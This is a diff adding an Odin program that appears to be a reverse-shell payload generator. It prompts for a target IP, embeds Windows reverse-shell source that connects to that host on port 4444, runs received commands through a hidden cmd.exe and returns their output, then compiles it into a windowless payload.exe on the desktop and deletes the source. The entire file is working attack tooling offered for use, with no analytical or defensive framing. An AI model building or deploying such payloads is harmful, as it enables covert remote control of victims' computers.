@@ -1,0 +1,118 @@
+package main
+
+import "core:os"
+import "core:os/os2"
+import "core:fmt"
+import "core:strings"
+
+main :: proc() {
+    drive := os.get_env("HOMEDRIVE")
+    path := os.get_env("HOMEPATH")
+    desktop_path := fmt.aprintf("%s%s\\Desktop\\payload.exe", drive, path)
+
+    // Using backticks throughout. Internal backticks are handled by joining.
+    fmt.println(`                                                                         
+$$\      $$\ $$\       $$\   $$\               $$$$$$$$\                  
+$$ | $\  $$ |$$ |      \__|  $$ |              $$  _____|                 
+$$ |$$$\ $$ |$$$$$$$\  $$\ $$$$$$\    $$$$$$\  $$ |    $$$$$$\  $$\   $$\ 
+$$ $$ $$\$$ |$$  __$$\ $$ |\_$$  _|  $$  __$$\ $$$$$\ $$  __$$\ \$$\ $$  |
+$$$$  _$$$$ |$$ |  $$ |$$ |  $$ |    $$$$$$$$ |$$  __|$$ /  $$ | \$$$$  / 
+$$$  / \$$$ |$$ |  $$ |$$ |  $$ |$$\ $$   ____|$$ |   $$ |  $$ | $$  $$<  
+$$  /   \$$ |$$ |  $$ |$$ |  \$$$$  |\$$$$$$$\ $$ |   \$$$$$$  |$$  /\$$\ 
+\__/     \__|\__|  \__|\__|   \____/  \_______|\__|    \______/ \__/  \__|
+                                                                          
+                                                                          
+                                                                                                                                                
+`)
+
+    fmt.print("Enter target IP: ")
+    buf: [1024]byte
+    n, _ := os2.read(os2.stdin, buf[:])
+    ip := strings.trim_space(string(buf[:n]))
+    
+    payload_source := fmt.aprintf(`package main
+import "core:net"
+import "core:os/os2"
+import "core:strings"
+import "core:sys/windows"
+import "core:fmt"
+
+main :: proc() {{
+    endpoint, _ := net.parse_endpoint("%s:4444")
+    socket, _ := net.dial_tcp(endpoint)
+    defer net.close(socket)
+    
+    for {{
+        buffer: [4096]byte
+        bytes_read, _ := net.recv_tcp(socket, buffer[:])
+        if bytes_read <= 0 {{ break }}
+        
+        program := strings.trim_space(string(buffer[:bytes_read]))
+        if program == "exit" {{ break }}
+
+        h_read, h_write: windows.HANDLE
+        sa := windows.SECURITY_ATTRIBUTES{{
+            nLength = size_of(windows.SECURITY_ATTRIBUTES),
+            bInheritHandle = true,
+        }}
+        
+        windows.CreatePipe(&h_read, &h_write, &sa, 0)
+        windows.SetHandleInformation(h_read, windows.HANDLE_FLAG_INHERIT, 0)
+
+        si := windows.STARTUPINFOW{{
+            cb = u32(size_of(windows.STARTUPINFOW)),
+            dwFlags = windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW,
+            wShowWindow = 0, 
+            hStdOutput = h_write,
+            hStdError  = h_write,
+        }}
+
+        pi: windows.PROCESS_INFORMATION
+        cmd_utf16 := windows.utf8_to_utf16(fmt.aprintf("cmd.exe /c %%s\x00", program))
+        
+        windows.CreateProcessW(
+            nil, 
+            cast(windows.wstring)raw_data(cmd_utf16), 
+            nil, nil, true, 
+            0x08000000, 
+            nil, nil, &si, &pi)
+
+        windows.CloseHandle(h_write)
+        
+        for {{
+            out_buf: [4096]byte
+            n_read: u32
+            if !windows.ReadFile(h_read, raw_data(out_buf[:]), 4096, &n_read, nil) || n_read == 0 {{
+                break
+            }}
+            net.send_tcp(socket, out_buf[:n_read])
+        }
+
+        windows.WaitForSingleObject(pi.hProcess, windows.INFINITE)
+        windows.CloseHandle(pi.hProcess)
+        windows.CloseHandle(pi.hThread)
+        windows.CloseHandle(h_read)
+    }}
+}}`, ip)
+    
+    os.write_entire_file("payload.odin", transmute([]byte)payload_source)
+    
+    compile_desc := os2.Process_Desc{
+        command = []string{
+            "odin", "build", "payload.odin", "-file",
+            fmt.aprintf("-out:%s", desktop_path),
+            "-o:speed", "-subsystem:windows",
+        },
+        stdout = os2.stdout,
+        stderr = os2.stderr,
+    }
+    
+    p, _ := os2.process_start(compile_desc)
+    _ , _ = os2.process_wait(p)
+    _ = os2.process_close(p)
+    
+    if os.exists(desktop_path) {
+        fmt.printf("\n[+] Success! Payload created at: %s\n", desktop_path)
+        os.remove("payload.odin")
+    }
+}
